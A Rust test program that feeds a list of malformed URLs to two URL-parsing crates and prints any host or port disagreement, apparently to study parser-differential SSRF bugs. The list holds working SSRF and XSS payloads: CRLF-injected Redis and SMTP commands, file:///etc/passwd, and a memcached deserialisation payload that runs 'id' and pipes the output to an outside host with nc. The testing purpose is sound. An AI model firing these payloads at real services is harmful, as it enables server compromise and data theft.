use http;
use url;

fn debug_httpuri(uri: &http::Uri) -> String {
    format!(
        "{{ scheme: {:?}, authority: {:?}, host: {:?}, port: {:?}, path: {:?}, query: {:?}, fragment: {:?} }}",
        uri.scheme(),
        uri.authority(),
        uri.host(),
        uri.port(),
        uri.path(),
        uri.query(),
        "" // TODO: How to handle fragment?
    )
}

fn debug_rusturl(url: &url::Url) -> String {
    format!(
        "{{ scheme: {:?}, host: {:?}, port: {:?}, path: {:?}, query: {:?}, fragment: {:?} }}",
        url.scheme(),
        url.host(),
        url.port(),
        url.path(),
        url.query(),
        url.fragment(),
    )
}

fn main() {
    let urls = [
        "javascript:alert(1)",
        "javascript://alert(1)",
        "javascript://%0aalert(1)+'aa@google.com/a'a",
        "javascript://%250aalert(1)+'aa@google.com/a'a",
        "http://[::1]:80/file#anchor",
        "http://[google.com]:80",
        "http://google.com]:80",
        "http://google.com]:80__Anything_you'd_like_sir",
        "http://[google.com]FreeTextZoneHere]:80",
        "http://aaaaa[google.com]:80",
        // Via https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
        "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
        "http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0A",
        "https://127.0.0.1 %0D%0AHELO orange.tw%0D%0AMAIL FROM example@example.com25/",
        "http://127.0.0.1:11211:80/",
        "http://google.com#@evil.com/",
        "http://foo@evil.com:80@google.com/",
        "http://foo@127.0.0.1 @google.com/",
        "http://orange.tw/sandbox/ＮＮ/passwd",
        "http://orange.tw/sandbox/\u{FF2E}\u{FF2E}/passwd",
        "http://127.0.0.1:6379/\r\nSLAVEOF orange.tw 6379\r\n",
        "http://127.0.0.1:6379/－＊SLAVEOF＠orange.tw＠6379－",
        "http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/",
        "http://127.0.0.1\tfoo.google.com",
        "http://127.0.0.1%09foo.google.com/",
        "http://127.0.0.1%2509.google.com/",
        "http://127.0.0.1\r\nSLAVEOF orange.tw 6379\r\n:6379/",
        "https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/",
        "http://0\r\n SLAVEOF orange.tw 6379\r\n :80'",
        "http://ⓖⓞⓞⓖⓛⓔ.com/",
        "http://g\u{200D}oogle.com/",
        "http://wordpreß.com/",
        "http://127.0.0.1:11211#@google.com:80/",
        "http://foo@127.0.0.1:11211@google.com:80/",
        "http://foo@127.0.0.1:11211 @google.com:80/",
        "http://0/",
        "http://0.0.0.0:8000/composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/queries/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Acount%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%0D%0A%0D%0A",
        // https://speakerdeck.com/mala/shibuya-dot-xss-techtalk-number-8
        "http://example.com/#hash#in#hash",
        "\u{0000}javascript:xxx",
        "//example.com",
        "/\\example.com",
        "http:example.com",
        "javascript://example.com%0A alert(1);",
        // https://core.trac.wordpress.org/changeset/36444
        "http://user:@example.com/",
        "",
        "http://:",
        "data:text/plain;charset=utf-8,Hello%20World!",
        "file:///etc/passwd",
        "ftp://example.com/",
    ];
    for url in urls.iter() {
        let urlcrate = match url::Url::parse(url) {
            Ok(url) => url,
            Err(_) => continue,
        };
        let httpcrate = match url.parse::<http::Uri>() {
            Ok(uri) => uri,
            Err(_) => continue,
        };

        let urlcrate_host = match urlcrate.host() {
            Some(host) => host.to_string(),
            None => "".to_string(),
        };
        let httpcrate_host = match httpcrate.host() {
            Some(host) => host,
            None => "",
        };

        let urlcrate_port = match urlcrate.port() {
            Some(port) => port,
            None => 0,
        };
        let httpcrate_port = match httpcrate.port() {
            Some(port) => port.as_u16(),
            None => 0,
        };

        if urlcrate_host != httpcrate_host || httpcrate_port != urlcrate_port {
            println!(
                "{}\n\t{}\n\t{}\n",
                url,
                debug_rusturl(&urlcrate),
                debug_httpuri(&httpcrate)
            );
        }
    }
}
